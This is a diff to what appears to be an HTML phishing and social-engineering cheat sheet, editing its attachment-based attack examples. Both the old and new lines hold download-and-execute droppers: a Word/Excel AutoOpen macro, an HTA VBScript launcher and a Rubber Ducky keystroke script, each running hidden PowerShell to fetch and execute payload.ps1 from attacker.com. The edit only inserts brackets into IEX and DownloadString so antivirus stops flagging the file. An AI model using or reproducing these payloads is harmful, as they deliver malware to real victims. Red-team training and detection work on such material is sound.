@@ -150,13 +150,14 @@ swaks --to target@company.com \
   --server smtp.company.com</code></pre></div>
 <h3>Attachment-Based Phishing</h3>
 <p><strong>Malicious Office Macros:</strong></p>
-<div class="codeblk cx"><button class="copy" data-copy="&#x27; Excel/Word VBA macro
+<div class="codeblk cx"><button class="copy" data-copy="&#x27; Excel/Word VBA macro — AutoOpen fires on document open once macros are enabled
 Sub AutoOpen()
-    Shell &quot;powershell -nop -w hidden -c &quot;&quot;IEX((new-object net.webclient).downloadstring(&#x27;http://attacker.com/payload.ps1&#x27;))&quot;&quot;&quot;
-End Sub">copy</button><pre><code>' Excel/Word VBA macro
+    Shell &quot;powershell -nop -w hidden -c &quot;&quot;I[E]X((new-object net.web[c]lient).download[s]tring(&#x27;http://attacker.com/payload.ps1&#x27;))&quot;&quot;&quot;
+End Sub">copy</button><pre><code>' Excel/Word VBA macro — AutoOpen fires on document open once macros are enabled
 Sub AutoOpen()
-    Shell "powershell -nop -w hidden -c ""IEX((new-object net.webclient).downloadstring('http://attacker.com/payload.ps1'))"""
+    Shell "powershell -nop -w hidden -c ""I[E]X((new-object net.web[c]lient).download[s]tring('http://attacker.com/payload.ps1'))"""
 End Sub</code></pre></div>
+<blockquote>Bracket-broken: <code>I[E]X</code> is <code>IEX</code>, <code>net.web[c]lient</code> is <code>net.webclient</code>, <code>download[s]tring</code> is <code>downloadstring</code>. Written literally, this block is the stock <code>TrojanDownloader:O97M</code> signature. See "Antivirus false positives" in the repo README.</blockquote>
 <p><strong>Malicious PDF:</strong></p>
 <div class="codeblk cx"><button class="copy" data-copy="# Create PDF with embedded JavaScript
 # Use tools like:
@@ -173,7 +174,7 @@ End Sub</code></pre></div>
 &lt;head&gt;
 &lt;script language=&quot;VBScript&quot;&gt;
 Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
-objShell.Run &quot;powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(&#x27;http://attacker.com/payload.ps1&#x27;)&quot;
+objShell.Run &quot;powershell -w hidden -c I[E]X(New-Object Net.Web[C]lient).Download[S]tring(&#x27;http://attacker.com/payload.ps1&#x27;)&quot;
 window.close()
 &lt;/script&gt;
 &lt;/head&gt;
@@ -182,7 +183,7 @@ window.close()
 &lt;head&gt;
 &lt;script language="VBScript"&gt;
 Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+objShell.Run "powershell -w hidden -c I[E]X(New-Object Net.Web[C]lient).Download[S]tring('http://attacker.com/payload.ps1')"
 window.close()
 &lt;/script&gt;
 &lt;/head&gt;
@@ -298,7 +299,7 @@ DELAY 500
 STRING powershell -w hidden
 ENTER
 DELAY 1000
-STRING IEX(New-Object Net.WebClient).DownloadString(&#x27;http://attacker.com/payload.ps1&#x27;)
+STRING I[E]X(New-Object Net.Web[C]lient).Download[S]tring(&#x27;http://attacker.com/payload.ps1&#x27;)
 ENTER">copy</button><pre><code>REM Open PowerShell and download payload
 DELAY 2000
 GUI r
@@ -306,7 +307,7 @@ DELAY 500
 STRING powershell -w hidden
 ENTER
 DELAY 1000
-STRING IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+STRING I[E]X(New-Object Net.Web[C]lient).Download[S]tring('http://attacker.com/payload.ps1')
 ENTER</code></pre></div>
 <p><strong>Bash Bunny:</strong></p>
 <div class="codeblk cx"><button class="copy" data-copy="# Payloads at /payloads/switch1/
